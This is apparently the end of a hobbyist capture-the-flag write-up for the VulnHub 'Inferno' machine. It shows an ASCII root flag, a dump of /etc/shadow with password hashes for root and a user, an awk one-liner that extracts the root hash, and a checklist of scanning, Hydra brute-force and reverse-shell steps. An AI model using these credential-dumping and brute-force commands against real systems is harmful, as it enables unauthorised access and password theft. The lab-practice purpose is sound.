...^.^.^^.^^..^.^^^..^^.^^^^!!^^!^^^!^^^^|!|||I66OMQMMMMMMMMMMMMMMQQQQMMMMMMMOOOO6OOOOOOOOOQOQOQQQOQOQQQ^^^^!^
..^^.^^..^.^^....^^..^^.^.^^.^^^^^.^!!^^|!!|||III66666OI6O6OOOOMMMQQQMMMMMMMMOOOQOO66OO6OOOOOOOOQOOQQQOQQ6^^^^
........^.^.^..^^..^^^^^!^!^^^^.^^^!^^!6|!||!II66I6666O66O6OOO6OQMMMQQMMMMMMMMOQOOO6O6O6OOOOOOQOQOQOOQQQOMI^^.
.. ^..^.^..^^.^..^..^^^^.^^.!^^^^^!^^^|!!!!!!I|II6II66QQOOQOOOQMMQMMMQMMMMMMMMOOQQOOOQMM6OOOOOOOQOOOQOQQQQM^.^
^...^.^.^..^^.^^.^.^..^^^^^^^^^!^^!|^|6OOOQOO66II6I666OMMMMMMMMMMMMMMMMMMMMMMMQQOQQOMMMOOOOOOOOOQQOOOOOQQQQM!^
.....^^..^.^..^^..^.^.^.!!^^!!^!^^!!IQOO6I|||IIO66666666QMMMMMMMMMMMMMMMMMMMMMQQOQOMMMMQOQOOOOQOOOQOOOQOQQQMO^
.^^.^..^^^^.^^..^^..^.^.^!^^^!^^^^^!|O66O6II|!II666O66I666MMMMMMMMMMMMMMMMMMMQQQQQMMMMMQOQOOOQOOOQOQOOOOQQMQQ!
^.^.^.^..^^^.^.^^.^^^.^^^^^^^^^^^^^!IIOO6I|!6II|66OO6666I6MQMMMMMMMMMMQMMMMMMMOOQQMMMMMMOQOQQQOOQOQOQOOQOQQQM|
.^..^.^..^..^^.^...^.^^.^^^.^.^^!^.I!IOO^|I6OQ66I66OO66IIIQQQOMMMMMMMMMMMMMMMMMQQQMMMMMMQQQOQOQQQOQQQOQOQQQQQM
^.^.^..^..^..^..^^^^.^^^^^^.^.^^^^6|IO666QOO6O6O6II66II6I6QQQMQOOMMMMMMMMMMMMMMMQMMMMMMMMQQQQOQMQOQQQQQOQQQQQQ
........^.^...^...^..^^^.^.^..^^I|I66II|!O|O666OI||I6I66I66QMQQMOOOOQOOQQQMMMMMMMQMMMMMMMMQMQMMMQQQQMQQOQQQQQQ
^.^.^^.....^.....^..^^^^^..^..^|!I66III||O6I|III!||I666666IQQMMMQ6OOOOOOQQOQMMMQMQMMMMMMMMQQMMMMMQQMQMMQQQQQQQ
..^.^.^...^......!...^.^.^^.^^^|6I66III!|I||||!!|II6O66O6666QMMMQ|OOOOQOOQQOQQQQMMMMMMMMMMQQMMMMMMQMQMQQQQQQQM
..^.^..^.^..^...^...^.^.^^..^^|III66I||||III||!||6I66O6OO6666MQQ|^||OMMMMMMMMMMQMMMMMMMMMMQMMQMMMMMMMQMQQQOQQQ
^.^.^^.^.^...^^^.^^.^.^^^.^^!|I6O6I6I6|III6I|IIII6666OOOO666O6OQ.^QMMMMMMMMMMMMMMMMMMMMMMMQMMMMMMMMQQQQQQOQQQM
.... ^....^...^^..^.^^^^.^^.^|I66I|66O6I6IIIIIII6OO66666O66666I!^QMMMMMMMMMMMMMMMMMMMMMMMMQMMMMMMMMMQQQQQQQQQM
....^. ^..^.^..^.....^^...^^6|II6OQQQ6I|I66I66III6OI666IO66666O.IMMMQQOMMMMMMMMMMMMMMMMMMQQMMMMMMMMMQQMQOQQOQQ
.^.....^.^..^......^^... ^.^^66O66OOO|!!II6II6666666II6II66666 .QI^^^^.!||QMMQMMQMQQQQMMMMQMMMMMMMMQOMMQQQQQQQ
^^..........^...^...  . .^..!^^^!^!III|!!66I|II6I6IIII|I6I6O6^.^^^.^...^^|!I6OOQOQQQOQQQQMMMMMMMMMMMQQQMQOQQQQ
...........^....^.......^..^^.^^^^O!||II||6II|III6IIIII6I66I|.^. ^... ....^^|I6QQOQOQQMMMMMMMMMMMMMQQMQQOQOQQQ
 ......^...^...^.... ^^..!^.^.^!^^^6OIII|||IIII|6IIIIIII66IO ^^. ... .....^^|III6QMMQMMMMMMMMMMMMQQQQMMQQQQQQQ
.^...... ...^^......^.^.^^^.^^^^^!66O66QOI|III6I|6I6III666O..^.^.... . ..^^^!IQMQMMMMMMMMMMMMMMMMQQQQQMQQQQQQM
.........^ ^.........^....^^^^^.^!!6II666|I66III6I66II6II66.^..^^^...^..^^|QQMMMMMMMMMMMMMMMMMMMMOOQQQMQOQQQQQ
 ... .....^ ...... . ^...^^^^^^^!^^6III||||I666O6IIII66666.!.^.^.....^.^O6OOOMQMMMMMMMMMMMMMMMMMMQOOQQQQQOQQQQ
.^..^..^^ .... . .. ... ^...^.^^.!|||||!|||I66I6IIII6I66O6.^^!.^O666I66O666O66OMMMMQMMMMMMMMMMMMQQQOQMQQQQOQQM
...^.......^... ... . ....^.^.^^^6||||II!|I6I66I66666O6O66!^IO666O6OO66O66666O6OO6OQQQMMMMMMMMMMQQOQQQQQQQMQQM
 .^........... ..... .....^ ...^.II6III6I666666OO666O6666I |6OO6666I666O6I666I6666O6OOQQMQQQMMMMQOOQQMQQQQQQMO
.^^......... ^....^... .. ...^.^^^!666666O66666OQOOQOOQOOO^6O6666666666OO666O6666666OOOMQOQ6OOMMQOQOQQQQQQOQM!
.^....^.. . ............. .^.^^...^^^^^^.^^.^^.^.^.^OOO6O6^I6I66I66666O66666I66O66OOO66O6O6OOOOMMOQQQQQQQQQQO!
..^..... ..^..........^.. .......^^.^.^.^.^..^.^^.^^!O6I6I.|66I6I666I6666I66666666IOOO6OOOOOOOOOMQQOQQQQQQQM!^
^....^...  .^..  . ...........^....^.^^.^^^..^.^..^^^OI|6| |III6I6I6IO66666666I6O6O6OOOOOOOOOOOOOQOQQQQQQQM!^!
....... . ...........^.....^ ... ..^^^^^^.^..^..^^.^^6|||| |I|II6I66I6I6I!I6O6OOO6OOOOOOOO6O6OO6OOQQQMQQQQO!^^
... ...... .. ..... ..^ ......^..^^^..^^..^^^....^^^|II!|| |III6I666|^|6O6OOOOOOQOOOOOOO6OOOO6O6O66QQQQMOQ^^^!
...  ...... ... .^^..^.....^.....^....^.^..^^.....^|6I.III.6|^||!I6I66OOO6OOO6OOO66OO6OOOOOOOOO66OOOOQQMQ!^^!^
....... .  ......^...^..^....^.^^^..^.....^^.^...^^!O66OO6 66O66OOOOO6OOOOO6OOO6O6O6OOOOO666OO6OOOQOOOQQ!^^^^!
^... .^.. .. .^..^... .....^.^^...^.^.^^^^..^..^^^!IO66666.OO6O6O66OO6OOOOOOOOOOOOOOO6O6OO666O6O6OOO6OOO^^^!!^
..^........... ...^.^^..^.^..^..^...^^...^.^.^..^I6O6I666||66OO6O6O6O6O6O6O6OOO6O6O666O666O6OO6O66O6OO6OOO6^!^
.^  ... ... ......^...^ ...^..^^.^^^^....^^...^I66I6O6666.66OOO66OO66O6OO6O6O66IO6666O66I6O6O6OO6O6OO6OOOO6OQ^
....^......^ ..^.^......^^.^..^.^...^....^.^.II6I6I66I6O6|O66O6O666I6II66O6II66I66666O6666666OOOO6O6OO6OOOOOOO
........ ..........^.^..............^...^^^IIIIIII6I6I6I.IIII6I6II6I6I66O6I66I66II6666666OO6OO6O66O66O6OOOOOQO
. . ... .. .^^.....^....^........^^^...^^!IIIIII6IIIII6.|III66III6I666I66I66O66I6I666666OO666666666OO6O6OO6OOQ
 .... .^.. . ^..^...^...^......^.!....^^II6I6I66I6II6I|I6II6III66I6I6II6I666I666666O6O66II66I6I6O66O6O6O6OOOOO
... . .... ..^......^..^...^^.^.^.^..^IIIIII66II6III6!III6666I666III666II666666666666II6III66I6I666OO6O6OOOOOO
.. . ..... . ......^^.. .^...^.^....II6IIIII66IIIIII!I66I6I66II66I66666II666666666I|IIIII6O6I666I6OO6OOOOOOO6O
...... ..... . .... ^..^.^..^^^...^I6IIIII66IIII6IIII66IIIIII66I6O66I66666666O6O6III6I6I6I66I6666O66O6OOOOOOOO
 . ....^.... . ............^...^^I6IIII66I66IIIII66III6III66I66666I6I6666666O66IIIII6I6I666666666666O6OOO6OOOO
 .  .......^^.....^. ......^^.^|II6IIII6I66IIIIIII6I6I6I6I6I666I66II66II666O66I6IIIII66I66II66O6O666O6OOOO6OOQ
  .. ......^^.. .^.....^.....^IIIIII6III66IIIIII6I6II6II66II66II66I6666666OOI6II6III|I66I6666I66OOI6O6OOOOOOOO
 . ....  ....^......^. .^.^.!|II6I|IIIIIIIII6III6III6I66I6I6I6II6I666I666O66IIIIIII6II6I6666I6666O666O6OOOOQOO
.  ... . .^..^..... ...^.^^|IIIIIII|II6IIIIIII6II66III6I666I666II66666O6OOIIIIIIIIIII6I66666I6666O6OO66OOOOO6O
..  ..... ^ ..... ^..^...^|I6IIIIIIII6IIIII6III6II6I6I6I666I6III66I6666OO6IIIIIIIIIII6I6O6I6I666O66O66O6OO6OOO
. ......  .. ..^.....^.^^IIIII|IIII6IIIII6II6II6I6II66I666I6II6666666O6O6I6IIIIIII6II6I6I6I666666O66O66OOOOOOO
..  ....   . ..^ .. .^.!III|I|IIII6IIIII6III66I6II6I66666O66I6666O666OQ66I6II6I|II6III6666I6666I666O6O6OOOOOOO
.  . .....  . .. ..^..II|I6|II|IIOIIIII6IIIIIIII6II6I666666I6I666O666O6I6IIIIIIII66III66I6666666O666O6O666OOOO
 ... .  .... .... ...II|!|IIII|I66IIII6IIIIIIIIIII6I6666O66II6666OO6OO666I6IIIII6II6I666IO66666666OO66OOOOOOQO
... ....^ ..^...^^.!6I|I|IIII|I6II6IIIIIII66II6III6II66666I666O6O66O66II6I6IIIIIIII66I66666666IO66666OO6OOOOOQ
    ......^.....^^^6IIII|6IIIIIIIIII6IIII6III6III66I66O666|66O6O6OOO66666IIIIIII6I666666IO66O666666O666OOOOOOO
. . .. . .....^.^^66II|IIIIIIIII6IIII6II6III6IIII66I6666I66666O6OOOOI66II6I6IIII666I6666666I666O666O66OOOOQOOQ
. .. ......^.^^^^II6II|IIII6IIIIIIIIII66I6IIIIII66I66O66I666OOO66OO66I66I66II6I666666O666666O6666O6O6OOOOOOOOO
  . ....^ .....^I6II|I6IIIIIIIIIIII6I6666III6I6I666O6O6666OO66OO6O6I6I6II6I6I6666I66O666O666O66O6O6O6O6OO6OQOQ
. ...^...^...^^II6IIIIIIIIIIIIII6I66I666III6I666666O6666666O6O66OO6O66I6I6III6II666666O666IO6OO6O6OO66O6OOOOOO
. . .. ...^.^^|I6III6IIIIIIIIII6666II666I6I6I66I666O66666OO6O666OOO66666II6I66I66666666O6666O66O6O666O6OOOOOOO
 ..^..^.....^II6IIIIII66IIIIIIII666I6III6II666666OO66666666O6OO6OO6666O6666II66666I66O66666O6O66O66OO6OOOOOOQQ
.... ..^..^.|I6II6IIIIII66IIII6I6II66I6II6I666666O666666O6OOO6OOOO66O666II6I666I66OO66O66666O6O666OO6OOOOOOQQO
..^..^.^.^.^I6I6III6II6IIII6I666I6666III6IO66666O66O6666666O6OOO6OO6O66I6I66I6666I6O6O6O66O6O6666OO6OO6OO6OOOQ
....^..^^.^6II6III6IIIIIII66666I6O66II6II6666O66OOO6I6O6O66OO6OO6O6O6666I6666I66666I666OO6O6OO6O66OO6OOOOOQOQQ
 ....^^^^^66I66II66IIIIII6O666I6666I6III6666O6O66O666IO6OO6O6O6OOO6O666666O6666666IO6666O66O66O6O666O6OOOOOOOO
^.^.^!^!^!6I666I6|IIIIII66666I66O6I6I6II66O66OOO6O6666666O6OOO6OOO6OII66O6666666O6OO666O66OO66O66666OOO6OOOOOO
...^.^^^.666I6IIIIIIII6I66I666O66III6III66666O66O6666666O6OO6O66OOO6OI666666666O66O6OO6666O6666O6OO6O66OOOOQOO
. .^..^.666I66IIIIIIIII|I66II666I6III6I6666I66O6O666666666O6O66OOO6I66I6OII66O66O6O6O6O66O6I6666O6O6O6OO6OOQQO
......^^I666IIIIIIIIIIIII6III66666III6I6I6O6OO6666666666666O6OO6666II6666I66666O666O66O6
root@Inferno:~# 
```

![](root_flag.png)

---
---

# BONUS

```bash
# Show all passwords hashes of the machine (needs root access of target machine)
root@VulnableComputer:~# cat /etc/shadow
root@Inferno:~# cat /etc/shadow
root:$6$UHbX4qEOQS9X5zyA$zxrNGjbIhgVppW.NSRSeCzpAzgsux11mBIltOVr84CJqnXmiCMVJxnWrggHBLhXc8iCrSRvo2IdXW7dtBlgpz1:18602:0:99999:7:::
daemon:*:18602:0:99999:7:::
bin:*:18602:0:99999:7:::            
sys:*:18602:0:99999:7:::
sync:*:18602:0:99999:7:::
games:*:18602:0:99999:7:::                
man:*:18602:0:99999:7:::
lp:*:18602:0:99999:7:::
mail:*:18602:0:99999:7:::
news:*:18602:0:99999:7:::
uucp:*:18602:0:99999:7:::
proxy:*:18602:0:99999:7:::
www-data:*:18602:0:99999:7:::
backup:*:18602:0:99999:7:::
list:*:18602:0:99999:7:::
irc:*:18602:0:99999:7:::
gnats:*:18602:0:99999:7:::
nobody:*:18602:0:99999:7:::
_apt:*:18602:0:99999:7:::
systemd-timesync:*:18602:0:99999:7:::
systemd-network:*:18602:0:99999:7:::
systemd-resolve:*:18602:0:99999:7:::
messagebus:*:18602:0:99999:7:::
avahi-autoipd:*:18602:0:99999:7:::
sshd:*:18602:0:99999:7:::
dante:$6$8QZSjeQM.zxEjcaI$5MfGLQGY76pmX0trQ7lRww3L3uQcoF.maOY7C4ifaPds66gQYEmc.Dh01rtmtTJ8WPVJCUl.zNmA8bZWAEPHX1:18602:0:99999:7:::
systemd-coredump:!!:18602::::::
root@Inferno:~# 


# Show only hashes of the machine root (needs root access of target machine)
root@Inferno:/home/dante# awk -F: '/^root/{print $2}' /etc/shadow
$6$UHbX4qEOQS9X5zyA$zxrNGjbIhgVppW.NSRSeCzpAzgsux11mBIltOVr84CJqnXmiCMVJxnWrggHBLhXc8iCrSRvo2IdXW7dtBlgpz1
```


---
---

# VulnHub Pentest Notes - [Inferno]  
🔍 **Target IP:** `192.168.56.41`  
🖥 **OS:** Linux  
📅 **Date:** 2025-05-23  

---
## Resources & References  
📌 [VulnHub Link](https://www.vulnhub.com/entry/inferno-11,603/)  
📌 [YouTube Walkthrough](https://www.youtube.com/watch?v=1rfEMoZaatI)  

---
# 🕵️ Enumeration  

### 🛜 Network Discovery  
- [ ] `sudo netdiscover -i eth1`
- [ ] `netdiscover -r <target-range>`  
- [ ] `arp-scan -l`  

### 🌐 Port Scanning  
- [ ] `nmap -sC -sV <IP>` (Basic Scan)
- [ ] `nmap -sC -sV <IP> -p-` (For all ports)
- [ ] `nmap -sC -sV -p- -oN nmap_scan.txt <IP>`
- [ ] `rustscan -a <IP> -- -A -oN rustscan.txt`  

### 🕸️ Web Enumeration  
- [ ] `gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt` (Check for any directories)
- [ ] `gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt`  (Directories with file extensions)
- [ ] `nikto -h http://<IP>/`  
- [ ] `hydra -l <Login Name> -P /usr/share/wordlists/rockyou.txt ftp://<IP>`

### 🔐 Credentials & SMB/NFS  
- [ ] `enum4linux -a <IP>`  
- [ ] `smbclient -L //<IP> -N`  
- [ ] `showmount -e <IP>`  

---
# 🦶 Initial Foothold  
- [ ] Identify possible exploits  
	- [ ] whatweb or Wappalyzer
- [ ] Try default credentials 🤡  
- [ ] Try Linpeas.sh 🫛
- [ ] Use Metasploit/Manual Exploitation  
- [ ] Upload and use a reverse shell  

---
---

This machine was a really fun mix of:
• Enumeration
• Web exploitation
• Credential discovery
• SSH foothold
• Linux privilege escalation

Key things I practiced during this challenge:

Full port enumeration with Nmap
Directory brute forcing using Gobuster
Password attacks with Hydra
Exploiting an outdated Codiad instance for remote code execution
Linux privilege escalation through misconfigured sudo permissions using GTFOBins techniques

One interesting lesson from this machine:
Sometimes a service appears “broken”, but the underlying vulnerable software is still there and exploitable if you continue investigating.

After a longer break from penetration testing while focusing on other projects, it felt great getting back into the mindset again.
